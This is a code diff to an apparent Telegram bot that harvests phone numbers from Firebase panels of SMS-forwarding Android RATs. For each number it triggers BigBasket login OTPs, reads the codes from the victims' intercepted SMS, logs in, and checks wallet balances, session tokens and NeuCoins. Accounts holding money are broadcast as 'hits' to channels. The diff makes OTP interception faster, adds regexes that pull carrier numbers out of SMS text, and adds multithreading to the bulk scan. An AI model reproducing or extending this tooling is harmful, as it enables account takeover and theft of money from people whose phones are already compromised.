@@ -743,18 +743,38 @@ def find_working_device_path(clean_url: str, did: str) -> str:
         DEVICE_PATH_CACHE[cache_key] = default_path
     return default_path
 
+def get_message_timestamp(item: dict) -> Optional[float]:
+    """Extracts timestamp as epoch seconds from SMS item."""
+    for k in ("timestamp", "time", "date", "date_sent", "id"):
+        val = item.get(k)
+        if val:
+            try:
+                t = float(val)
+                if t > 1e12:
+                    t /= 1000.0
+                return t
+            except (ValueError, TypeError):
+                pass
+    return None
+
 def fetch_existing_message_keys(fb_url: str, did: str) -> Set[str]:
-    known = set()
     clean_url = fb_url.rstrip("/")
     active_path = find_working_device_path(clean_url, did)
     try:
-        endpoint = f"{clean_url}/{active_path}.json"
-        r = requests.get(endpoint, timeout=5)
+        # Ultra-fast shallow fetch (100ms, avoids downloading megabytes of old SMS)
+        r = requests.get(f"{clean_url}/{active_path}.json?shallow=true", timeout=4)
         if r.status_code == 200 and isinstance(r.json(), dict):
-            known.update(str(k) for k in r.json().keys())
+            return set(str(k) for k in r.json().keys())
     except Exception:
         pass
-    return known
+    try:
+        endpoint = f"{clean_url}/{active_path}.json"
+        r = requests.get(endpoint, timeout=4)
+        if r.status_code == 200 and isinstance(r.json(), dict):
+            return set(str(k) for k in r.json().keys())
+    except Exception:
+        pass
+    return set()
 
 def watch_device_otp(
     fb_url: str,
@@ -769,30 +789,81 @@ def watch_device_otp(
     clean_url = fb_url.rstrip("/")
     start_time = time.time()
     active_path = find_working_device_path(clean_url, did)
+    local_known = set(known_keys)
 
     while time.time() - start_time < timeout_sec:
         if stop_checker and stop_checker():
             return None
 
+        # 1. Shallow polling for new keys (lightweight & avoids OOM)
+        try:
+            r = requests.get(f"{clean_url}/{active_path}.json?shallow=true", timeout=3)
+            if r.status_code == 200 and isinstance(r.json(), dict):
+                current_keys = set(str(k) for k in r.json().keys())
+                new_keys = [k for k in current_keys if k not in local_known]
+                if new_keys:
+                    def _sk(k_str):
+                        try:
+                            return (0, int(k_str))
+                        except ValueError:
+                            return (1, str(k_str))
+                    sorted_new = sorted(new_keys, key=_sk, reverse=True)
+                    for nk in sorted_new:
+                        local_known.add(nk)
+                        try:
+                            r_m = requests.get(f"{clean_url}/{active_path}/{nk}.json", timeout=3)
+                            if r_m.status_code == 200 and isinstance(r_m.json(), dict):
+                                item = r_m.json()
+                                text = str(item.get("message") or item.get("body") or item.get("msg") or item.get("text") or "")
+                                sender = str(item.get("sender") or item.get("phone") or item.get("address") or "").upper()
+                                ts = get_message_timestamp(item)
+                                if ts is not None and ts < (sent_time - 25):
+                                    continue
+                                otp = extract_bb_otp(text, sender)
+                                if otp:
+                                    return otp
+                        except Exception:
+                            pass
+        except Exception:
+            pass
+
+        # 2. Fallback: Full node scan
         try:
             endpoint = f"{clean_url}/{active_path}.json"
-            r = requests.get(endpoint, timeout=4)
+            r = requests.get(endpoint, timeout=3)
             if r.status_code == 200 and isinstance(r.json(), dict):
                 data = r.json()
                 for mk, item in reversed(list(data.items())):
-                    if str(mk) in known_keys or not isinstance(item, dict):
+                    mk_str = str(mk)
+                    if mk_str in local_known or not isinstance(item, dict):
                         continue
+                    local_known.add(mk_str)
                     text = str(item.get("message") or item.get("body") or item.get("msg") or item.get("text") or "")
                     sender = str(item.get("sender") or item.get("phone") or item.get("address") or "").upper()
+                    ts = get_message_timestamp(item)
+                    if ts is not None and ts < (sent_time - 25):
+                        continue
                     otp = extract_bb_otp(text, sender)
                     if otp:
                         return otp
         except Exception:
             pass
-        time.sleep(2.0)
+
+        time.sleep(1.5)
     return None
 
 # ============ JIO-BOT EQUIVALENT ONLINE & SIM AUDITOR ============
+CARRIER_PATTERNS = [
+    re.compile(r"(?i)\bjio\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})\b"),
+    re.compile(r"(?i)\brecharge(?:\s+now)?\s+jio\s+no[.]?\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})\b"),
+    re.compile(r"(?i)\b(?:your|for)\s+(?:jio\s+)?(?:mobile|number|no)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})\b"),
+    re.compile(r"(?i)\bmyjio\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})\b"),
+    re.compile(r"(?i)\bairtel\s*(?:number|no[.]?|mobile)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})\b"),
+    re.compile(r"(?i)\b(?:vi|vodafone|idea)\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})\b"),
+    re.compile(r"(?i)\bbsnl\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})\b"),
+    re.compile(r"(?i)\b(?:recharge|mobile|quota|plan)\s+(?:for|on)\s+(?:no[.]?|number)?\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})\b"),
+]
+
 def is_device_online(data: Any) -> bool:
     """Robust online detector matching Jio-Automation engine."""
     if not isinstance(data, dict):
@@ -839,13 +910,42 @@ def is_device_online(data: Any) -> bool:
                 except Exception:
                     pass
 
-    # If neither explicit offline nor timestamp, do not drop device (keep as potentially active)
     return True
 
-def audit_device_sim_slots(did: str, dev_data: dict, fb_url: str, panel_ref: str) -> List[Dict[str, Any]]:
+def get_device_poison_numbers(dev_data: dict) -> Set[str]:
+    """
+    Identifies phantom/attacker outgoing message recipient numbers.
+    In SMS forwarder RAT panels, outgoing broadcast/challan SMS actions
+    store recipient numbers in 'action', 'commands', 'sendSms', 'sms', 'command',
+    'webhookEvent', 'targetNumber', etc. These must be purged to prevent phantom checks.
+    """
+    poison = set()
+    for k in ("action", "commands", "sendSms", "sms", "command", "webhookEvent", "inbox", "chats"):
+        sub = dev_data.get(k)
+        if isinstance(sub, dict):
+            for sk in ("number", "phone", "phoneNumber", "targetNumber", "to", "recipient"):
+                v = sub.get(sk)
+                n = normalize_phone(v)
+                if n:
+                    poison.add(n)
+            for sub_sub in sub.values():
+                if isinstance(sub_sub, dict):
+                    for ssk in ("number", "phone", "phoneNumber", "targetNumber", "to", "recipient"):
+                        v = sub_sub.get(ssk)
+                        n = normalize_phone(v)
+                        if n:
+                            poison.add(n)
+        elif isinstance(sub, str):
+            n = normalize_phone(sub)
+            if n:
+                poison.add(n)
+    return poison
+
+def audit_device_sim_slots(did: str, dev_data: dict, fb_url: str, panel_ref: str, active_path: str = "") -> List[Dict[str, Any]]:
     targets = []
     seen = set()
     dev_name = dev_data.get("modelName") or dev_data.get("model") or dev_data.get("device") or "Android Device"
+    poison = get_device_poison_numbers(dev_data)
 
     candidates = [dev_data]
     for sub_k in ("info", "deviceInfo", "device_info", "details", "system", "client"):
@@ -853,19 +953,31 @@ def audit_device_sim_slots(did: str, dev_data: dict, fb_url: str, panel_ref: str
         if isinstance(sub, dict):
             candidates.append(sub)
 
+    # 1. PRIORITY ONE: Direct mobNo (Standard for Indian SMS forwarder Android RAT apps)
     for c in candidates:
-        # 1. Direct phone keys
-        for k in (
-            "phoneNumber", "phone", "phone_number", "mobNo", "mobile", "number",
-            "sim1", "sim_1", "sim2", "sim_2", "simNumber", "sim1Number", "sim2Number",
-            "sim_number", "line1Number", "line1_number", "telephone"
-        ):
+        m = normalize_phone(c.get("mobNo"))
+        if m and m not in poison and m not in seen:
+            seen.add(m)
+            targets.append({
+                "phone": m,
+                "device": dev_name,
+                "dev_id": did,
+                "panel": fb_url,
+                "panel_name": panel_ref,
+                "slot": "Hardware SIM (mobNo)",
+                "is_physical_sim": True,
+                "base_path": active_path or "clients"
+            })
+
+    # 2. PRIORITY TWO: Dedicated Hardware SIM slot keys
+    for c in candidates:
+        for k in ("sim1Number", "sim2Number", "simNumber", "line1Number", "line1_number", "telephone"):
             val = c.get(k)
             if val:
                 num = normalize_phone(val)
-                if num and num not in seen:
+                if num and num not in poison and num not in seen:
                     seen.add(num)
-                    slot_title = "Hardware SIM Slot 1" if "1" in k or k in ("mobNo", "phoneNumber", "phone", "mobile") else "Hardware SIM Slot 2"
+                    slot_title = "Hardware SIM Slot 1" if "1" in k else "Hardware SIM Slot 2"
                     targets.append({
                         "phone": num,
                         "device": dev_name,
@@ -873,10 +985,12 @@ def audit_device_sim_slots(did: str, dev_data: dict, fb_url: str, panel_ref: str
                         "panel": fb_url,
                         "panel_name": panel_ref,
                         "slot": slot_title,
-                        "is_physical_sim": True
+                        "is_physical_sim": True,
+                        "base_path": active_path or "clients"
                     })
 
-        # 2. sims / simInfo containers
+    # 3. PRIORITY THREE: sims / simInfo containers
+    for c in candidates:
         for sim_key in ("sims", "simInfo", "sim_info", "simList", "sim_list"):
             sim_container = c.get(sim_key)
             if isinstance(sim_container, str):
@@ -896,7 +1010,7 @@ def audit_device_sim_slots(did: str, dev_data: dict, fb_url: str, panel_ref: str
                         for sk in ("phoneNumber", "phone", "number", "simNumber", "line1Number"):
                             raw_num = s.get(sk)
                             num = normalize_phone(raw_num)
-                            if num and num not in seen:
+                            if num and num not in poison and num not in seen:
                                 seen.add(num)
                                 targets.append({
                                     "phone": num,
@@ -905,32 +1019,73 @@ def audit_device_sim_slots(did: str, dev_data: dict, fb_url: str, panel_ref: str
                                     "panel": fb_url,
                                     "panel_name": panel_ref,
                                     "slot": f"Hardware SIM Slot {slot_num} ({carrier})",
-                                    "is_physical_sim": True
+                                    "is_physical_sim": True,
+                                    "base_path": active_path or "clients"
                                 })
 
-    # 3. Embedded SMS / messages metadata fallback
+    # 4. PRIORITY FOUR: Root phoneNumber / phone / number ONLY IF strictly clean & not in poison
     if not targets:
-        for msg_key in ("messages", "sms", "chats", "smsList", "sms_list"):
-            msg_container = dev_data.get(msg_key)
-            if isinstance(msg_container, dict):
-                for m_item in list(msg_container.values())[-10:]:
-                    if isinstance(m_item, dict):
-                        for mk in ("phoneNumber", "phone", "number", "to", "simInfo"):
-                            m_val = m_item.get(mk)
-                            if isinstance(m_val, dict):
-                                m_val = m_val.get("phoneNumber") or m_val.get("phone")
-                            m_num = normalize_phone(m_val)
-                            if m_num and m_num not in seen:
-                                seen.add(m_num)
-                                targets.append({
-                                    "phone": m_num,
-                                    "device": dev_name,
-                                    "dev_id": did,
-                                    "panel": fb_url,
-                                    "panel_name": panel_ref,
-                                    "slot": "Associated Device Line",
-                                    "is_physical_sim": True
-                                })
+        for c in candidates:
+            for k in ("phoneNumber", "phone_number", "phone", "mobile", "number"):
+                val = c.get(k)
+                if val:
+                    num = normalize_phone(val)
+                    if num and num not in poison and num not in seen:
+                        seen.add(num)
+                        targets.append({
+                            "phone": num,
+                            "device": dev_name,
+                            "dev_id": did,
+                            "panel": fb_url,
+                            "panel_name": panel_ref,
+                            "slot": "Hardware SIM (Clean)",
+                            "is_physical_sim": True,
+                            "base_path": active_path or "clients"
+                        })
+
+    # 5. PRIORITY FIVE: Inspect Carrier SMS from messages/{did} when SIM is absent (matches Jio Bot)
+    if not targets and fb_url and did:
+        clean_url = fb_url.rstrip("/")
+        try:
+            r_shallow = requests.get(f"{clean_url}/messages/{did}.json?shallow=true", timeout=3)
+            if r_shallow.status_code == 200 and isinstance(r_shallow.json(), dict) and r_shallow.json():
+                def _sk(k_str):
+                    try:
+                        return (0, int(k_str))
+                    except ValueError:
+                        return (1, str(k_str))
+                sorted_keys = sorted(r_shallow.json().keys(), key=_sk)[-8:]
+                for mk in reversed(sorted_keys):
+                    try:
+                        r_item = requests.get(f"{clean_url}/messages/{did}/{mk}.json", timeout=2)
+                        if r_item.status_code == 200 and isinstance(r_item.json(), dict):
+                            item = r_item.json()
+                            text = str(item.get("message") or item.get("body") or item.get("msg") or "")
+                            sender = str(item.get("sender") or "").upper()
+                            for pat in CARRIER_PATTERNS:
+                                m = pat.search(text)
+                                if m:
+                                    carrier_num = normalize_phone(m.group(1))
+                                    if carrier_num and carrier_num not in poison and carrier_num not in seen:
+                                        seen.add(carrier_num)
+                                        carrier_label = "Jio" if "JIO" in sender or "JIO" in text.upper() else ("Airtel" if "AIR" in sender else "Carrier")
+                                        targets.append({
+                                            "phone": carrier_num,
+                                            "device": dev_name,
+                                            "dev_id": did,
+                                            "panel": fb_url,
+                                            "panel_name": panel_ref,
+                                            "slot": f"Verified {carrier_label} Line",
+                                            "is_physical_sim": True,
+                                            "base_path": active_path or "clients"
+                                        })
+                                        break
+                            if targets:
+                                break
+                    except Exception:
+                        pass
+        except Exception:
+            pass
 
     return targets
 
@@ -940,6 +1095,7 @@ def harvest_panel_online_targets(raw_panel: str) -> Tuple[List[Dict[str, Any]], 
         return [], 0, "Invalid Firebase URL"
     clean_url = fb_url.rstrip("/")
     devices_dict = None
+    found_path = "clients"
 
     candidate_paths = [
         "clients.json", "devices.json", "data/clients.json", "data/devices.json",
@@ -952,6 +1108,7 @@ def harvest_panel_online_targets(raw_panel: str) -> Tuple[List[Dict[str, Any]], 
             r = requests.get(f"{clean_url}/{p}", timeout=6)
             if r.status_code == 200 and isinstance(r.json(), dict) and r.json():
                 devices_dict = r.json()
+                found_path = p.replace(".json", "")
                 break
         except Exception:
             pass
@@ -966,6 +1123,7 @@ def harvest_panel_online_targets(raw_panel: str) -> Tuple[List[Dict[str, Any]], 
                         r_sub = requests.get(f"{clean_url}/{k}.json", timeout=6)
                         if r_sub.status_code == 200 and isinstance(r_sub.json(), dict) and r_sub.json():
                             devices_dict = r_sub.json()
+                            found_path = str(k)
                             break
         except Exception:
             pass
@@ -977,11 +1135,18 @@ def harvest_panel_online_targets(raw_panel: str) -> Tuple[List[Dict[str, Any]], 
     online_targets = []
     seen_nums = set()
 
+    online_devs = []
     for did, dev_data in devices_dict.items():
-        if not isinstance(dev_data, dict):
-            continue
-        if is_device_online(dev_data):
-            dev_targets = audit_device_sim_slots(str(did), dev_data, fb_url, raw_panel)
+        if isinstance(dev_data, dict) and is_device_online(dev_data):
+            online_devs.append((str(did), dev_data))
+
+    def _audit_single(item):
+        did, dev_data = item
+        return audit_device_sim_slots(did, dev_data, fb_url, raw_panel, found_path)
+
+    with ThreadPoolExecutor(max_workers=min(10, max(1, len(online_devs)))) as ex:
+        results = ex.map(_audit_single, online_devs)
+        for dev_targets in results:
             for t in dev_targets:
                 if t["phone"] not in seen_nums:
                     seen_nums.add(t["phone"])
@@ -1003,11 +1168,11 @@ def parse_scraped_file(filepath_or_content: str, fallback_panel: str = "") -> Li
     targets = []
     seen = set()
 
-    if "," in content and ("Phone Number" in content or "Device ID" in content or "Firebase" in content):
+    if "," in content and ("Phone Number" in content or "Device ID" in content or "Firebase" in content or "mobNo" in content):
         try:
             reader = csv.DictReader(io.StringIO(content))
             for row in reader:
-                raw_num = row.get("Phone Number") or row.get("Raw Number") or row.get("phone") or row.get("number")
+                raw_num = row.get("mobNo") or row.get("Mobile") or row.get("mobile") or row.get("Phone Number") or row.get("Raw Number") or row.get("phone") or row.get("number")
                 num = normalize_phone(raw_num)
                 if num and num not in seen:
                     seen.add(num)
@@ -1054,6 +1219,15 @@ def parse_scraped_file(filepath_or_content: str, fallback_panel: str = "") -> Li
     return targets
 
 # ============ MULTI-THREADED SCAN ENGINE ============
+DEVICE_SCAN_LOCKS: Dict[str, threading.Lock] = {}
+device_lock_manager = threading.Lock()
+
+def get_device_lock(did: str) -> threading.Lock:
+    with device_lock_manager:
+        if did not in DEVICE_SCAN_LOCKS:
+            DEVICE_SCAN_LOCKS[did] = threading.Lock()
+        return DEVICE_SCAN_LOCKS[did]
+
 def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str = "BigBasket Bulk Scan", resume_data: Optional[Dict[str, Any]] = None):
     with scan_lock:
         if chat_id in active_scans and active_scans[chat_id].get("running"):
@@ -1169,123 +1343,132 @@ def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str =
         fb_url = item.get("panel", "")
         slot = item.get("slot", "SIM 1")
         dev_name = item.get("device", "Unknown Device")
+        base_path = item.get("base_path", "clients")
 
-        update_progress_ui(phone, dev_name, slot)
+        dev_lock = get_device_lock(did) if did else None
+        if dev_lock:
+            dev_lock.acquire()
 
-        # 1. Quick check: Is device online? (if linked)
-        if fb_url and did:
-            clean_url = fb_url.rstrip("/")
-            try:
-                r_st = requests.get(f"{clean_url}/clients/{did}/status.json", timeout=2)
-                if r_st.status_code == 200 and r_st.json() is False:
-                    with scan_lock:
-                        if chat_id in active_scans:
-                            active_scans[chat_id]["offline"].append({"phone": phone, "device": dev_name})
-                            active_scans[chat_id]["processed"] += 1
-                            active_scans[chat_id]["processed_phones"].append(phone)
-                            save_scan_state(chat_id)
-                    return
-            except Exception:
-                pass
+        try:
+            update_progress_ui(phone, dev_name, slot)
 
-        # 2. Fetch pre-existing keys before sending OTP
-        known_keys = set()
-        if fb_url and did:
-            known_keys = fetch_existing_message_keys(fb_url, did)
+            # 1. Quick check: Is device online? (if linked)
+            if fb_url and did:
+                clean_url = fb_url.rstrip("/")
+                try:
+                    r_st = requests.get(f"{clean_url}/{base_path}/{did}/status.json", timeout=2)
+                    if r_st.status_code == 200 and r_st.json() is False:
+                        with scan_lock:
+                            if chat_id in active_scans:
+                                active_scans[chat_id]["offline"].append({"phone": phone, "device": dev_name})
+                                active_scans[chat_id]["processed"] += 1
+                                active_scans[chat_id]["processed_phones"].append(phone)
+                                save_scan_state(chat_id)
+                        return
+                except Exception:
+                    pass
 
-        # 3. Trigger BigBasket OTP
-        bb = BigBasketClient()
-        sent_ts = time.time()
-        ok_send, ref_or_err = bb.send_otp(phone)
+            # 2. Fetch pre-existing keys before sending OTP
+            known_keys = set()
+            if fb_url and did:
+                known_keys = fetch_existing_message_keys(fb_url, did)
 
-        if not ok_send:
+            # 3. Trigger BigBasket OTP
+            bb = BigBasketClient()
+            sent_ts = time.time()
+            ok_send, ref_or_err = bb.send_otp(phone)
+
+            if not ok_send:
+                with scan_lock:
+                    if chat_id in active_scans:
+                        if "does not exist" in ref_or_err.lower() or "inactive" in ref_or_err.lower():
+                            active_scans[chat_id]["no_account"].append({"phone": phone, "device": dev_name})
+                        else:
+                            active_scans[chat_id]["failed"].append({"phone": phone, "reason": ref_or_err, "device": dev_name})
+                        active_scans[chat_id]["processed"] += 1
+                        active_scans[chat_id]["processed_phones"].append(phone)
+                        save_scan_state(chat_id)
+                return
+
+            ref_id = ref_or_err
+            otp_code = None
+
+            # 4. Auto-catch OTP from Firebase
+            stop_fn = lambda: active_scans.get(chat_id, {}).get("stop_requested", False)
+            if fb_url and did:
+                otp_code = watch_device_otp(fb_url, did, known_keys, sent_ts, timeout_sec=40, stop_checker=stop_fn)
+
+            if not otp_code:
+                with scan_lock:
+                    if chat_id in active_scans:
+                        active_scans[chat_id]["timeout"].append({"phone": phone, "device": dev_name})
+                        active_scans[chat_id]["processed"] += 1
+                        active_scans[chat_id]["processed_phones"].append(phone)
+                        save_scan_state(chat_id)
+                return
+
+            # 5. Auto-Verify OTP Login
+            ok_verify, token_or_err, auth_data = bb.verify(phone, otp_code, ref_id)
+            if not ok_verify:
+                with scan_lock:
+                    if chat_id in active_scans:
+                        active_scans[chat_id]["failed"].append({"phone": phone, "reason": f"Verify Failed: {token_or_err}", "device": dev_name})
+                        active_scans[chat_id]["processed"] += 1
+                        active_scans[chat_id]["processed_phones"].append(phone)
+                        save_scan_state(chat_id)
+                return
+
+            # 6. Check BigBasket Wallet Balance
+            w = bb.wallet()
+            tb = w.get("total_balance", 0.0) if w else 0.0
+            cb = w.get("current_wallet_balance", 0.0) if w else 0.0
+            coins = w.get("neucoins", 0) if w else 0
+            cust_name = w.get("name") if w and w.get("name") else "BigBasket User"
+
+            hit_record = {
+                "phone": phone,
+                "total_balance": tb,
+                "free_cash": cb,
+                "neucoins": coins,
+                "name": cust_name,
+                "token": bb.token,
+                "device": dev_name,
+                "dev_id": did,
+                "panel": item.get("panel_name") or fb_url,
+                "slot": slot,
+                "checked_at": datetime.now().strftime("%d-%m-%Y %H:%M:%S")
+            }
+
             with scan_lock:
                 if chat_id in active_scans:
-                    if "does not exist" in ref_or_err.lower() or "inactive" in ref_or_err.lower():
-                        active_scans[chat_id]["no_account"].append({"phone": phone, "device": dev_name})
+                    active_scans[chat_id]["processed"] += 1
+                    active_scans[chat_id]["processed_phones"].append(phone)
+                    if tb > 0 or cb > 0 or coins > 0:
+                        active_scans[chat_id]["hits"].append(hit_record)
                     else:
-                        active_scans[chat_id]["failed"].append({"phone": phone, "reason": ref_or_err, "device": dev_name})
-                    active_scans[chat_id]["processed"] += 1
-                    active_scans[chat_id]["processed_phones"].append(phone)
+                        active_scans[chat_id]["zero_bal"].append(hit_record)
                     save_scan_state(chat_id)
-            return
 
-        ref_id = ref_or_err
-        otp_code = None
-
-        # 4. Auto-catch OTP from Firebase
-        stop_fn = lambda: active_scans.get(chat_id, {}).get("stop_requested", False)
-        if fb_url and did:
-            otp_code = watch_device_otp(fb_url, did, known_keys, sent_ts, timeout_sec=40, stop_checker=stop_fn)
-
-        if not otp_code:
-            with scan_lock:
-                if chat_id in active_scans:
-                    active_scans[chat_id]["timeout"].append({"phone": phone, "device": dev_name})
-                    active_scans[chat_id]["processed"] += 1
-                    active_scans[chat_id]["processed_phones"].append(phone)
-                    save_scan_state(chat_id)
-            return
-
-        # 5. Auto-Verify OTP Login
-        ok_verify, token_or_err, auth_data = bb.verify(phone, otp_code, ref_id)
-        if not ok_verify:
-            with scan_lock:
-                if chat_id in active_scans:
-                    active_scans[chat_id]["failed"].append({"phone": phone, "reason": f"Verify Failed: {token_or_err}", "device": dev_name})
-                    active_scans[chat_id]["processed"] += 1
-                    active_scans[chat_id]["processed_phones"].append(phone)
-                    save_scan_state(chat_id)
-            return
-
-        # 6. Check BigBasket Wallet Balance
-        w = bb.wallet()
-        tb = w.get("total_balance", 0.0) if w else 0.0
-        cb = w.get("current_wallet_balance", 0.0) if w else 0.0
-        coins = w.get("neucoins", 0) if w else 0
-        cust_name = w.get("name") if w and w.get("name") else "BigBasket User"
-
-        hit_record = {
-            "phone": phone,
-            "total_balance": tb,
-            "free_cash": cb,
-            "neucoins": coins,
-            "name": cust_name,
-            "token": bb.token,
-            "device": dev_name,
-            "dev_id": did,
-            "panel": item.get("panel_name") or fb_url,
-            "slot": slot,
-            "checked_at": datetime.now().strftime("%d-%m-%Y %H:%M:%S")
-        }
-
-        with scan_lock:
-            if chat_id in active_scans:
-                active_scans[chat_id]["processed"] += 1
-                active_scans[chat_id]["processed_phones"].append(phone)
-                if tb > 0 or cb > 0 or coins > 0:
-                    active_scans[chat_id]["hits"].append(hit_record)
-                else:
-                    active_scans[chat_id]["zero_bal"].append(hit_record)
-                save_scan_state(chat_id)
-
-        # Instant notification on Hit
-        if tb > 0 or cb > 0 or coins > 0:
-            hit_card = (
-                f"🎉 <b>🔥 BIGBASKET HIT FOUND!</b>\n"
-                f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"📱 <b>Mobile:</b> <code>+91 {esc(phone)}</code>\n"
-                f"👤 <b>Customer:</b> <b>{esc(cust_name)}</b>\n"
-                f"💰 <b>Total Balance:</b> <b>₹{tb:.2f}</b>\n"
-                f"🆓 <b>Free Usable Cash:</b> <b>₹{cb:.2f}</b>\n"
-                f"🪙 <b>NeuCoins:</b> <b>{coins}</b>\n"
-                f"📟 <b>Device:</b> <code>{esc(dev_name)}</code> ({esc(slot)})\n"
-                f"🌐 <b>Panel:</b> <code>{esc(item.get('panel_name') or fb_url)}</code>\n"
-                f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"✅ <i>Saved to report & broadcast to channels!</i>"
-            )
-            safe_send(chat_id, hit_card)
-            broadcast_hit_to_channels(hit_card, chat_id)
+            # Instant notification on Hit
+            if tb > 0 or cb > 0 or coins > 0:
+                hit_card = (
+                    f"🎉 <b>🔥 BIGBASKET HIT FOUND!</b>\n"
+                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                    f"📱 <b>Mobile:</b> <code>+91 {esc(phone)}</code>\n"
+                    f"👤 <b>Customer:</b> <b>{esc(cust_name)}</b>\n"
+                    f"💰 <b>Total Balance:</b> <b>₹{tb:.2f}</b>\n"
+                    f"🆓 <b>Free Usable Cash:</b> <b>₹{cb:.2f}</b>\n"
+                    f"🪙 <b>NeuCoins:</b> <b>{coins}</b>\n"
+                    f"📟 <b>Device:</b> <code>{esc(dev_name)}</code> ({esc(slot)})\n"
+                    f"🌐 <b>Panel:</b> <code>{esc(item.get('panel_name') or fb_url)}</code>\n"
+                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                    f"✅ <i>Saved to report & broadcast to channels!</i>"
+                )
+                safe_send(chat_id, hit_card)
+                broadcast_hit_to_channels(hit_card, chat_id)
+        finally:
+            if dev_lock:
+                dev_lock.release()
 
     # Launch multi-threaded workers
     with ThreadPoolExecutor(max_workers=MAX_SCAN_WORKERS) as executor:
